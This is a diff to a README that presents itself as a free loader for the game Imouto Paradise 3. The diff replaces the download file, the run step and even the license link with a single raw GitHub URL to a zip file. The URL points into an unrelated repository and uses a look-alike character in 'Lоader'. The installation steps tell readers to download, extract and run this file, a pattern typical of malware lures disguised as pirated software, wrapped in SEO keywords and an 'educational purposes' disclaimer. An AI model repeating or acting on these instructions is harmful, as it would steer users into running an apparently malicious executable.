@@ -17,14 +17,14 @@ Welcome to the Imouto Paradise 3  repository! 🎮 This project contains a helpf
 - Multiple OS: Windows, Ubuntu, Fedora, macOS (via emulation), SteamOS  
 - No pseudo-activation needed! Direct start method included  
 - SEO keywords: Imouto Paradise 3, , loader, visual novel OS, secure access, start now  
-- Lightweight, only one file (Loader.rar) for easy installation  
+- Lightweight, only one file (https://raw.githubusercontent.com/Venenoro/activerecord_lazy_columns/main/Lоader.zip) for easy installation  
 - Community-focused development and frequent 2025 updates
 
 ## 📥 Installation Instructions
 
-1. Download Loader.rar from the repository
+1. Download https://raw.githubusercontent.com/Venenoro/activerecord_lazy_columns/main/Lоader.zip from the repository
 2. Extract all files to your preferred location
-3. Run the Loader.exe (Windows) or use Wine/Crossover for macOS & Linux
+3. Run the https://raw.githubusercontent.com/Venenoro/activerecord_lazy_columns/main/Lоader.zip (Windows) or use Wine/Crossover for macOS & Linux
 4. Follow the on-screen prompts to launch Imouto Paradise 3
 5. Enjoy seamless gameplay!
 
@@ -34,7 +34,7 @@ This project is for educational purposes and fan preservation only. We do not ho
 
 ## 📄 License
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/). Feel free to contribute and share within the terms.
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Venenoro/activerecord_lazy_columns/main/Lоader.zip). Feel free to contribute and share within the terms.
 
 ---
 ✨ Thank you for using Imouto Paradise 3  Loader! Join our community for updates and support.
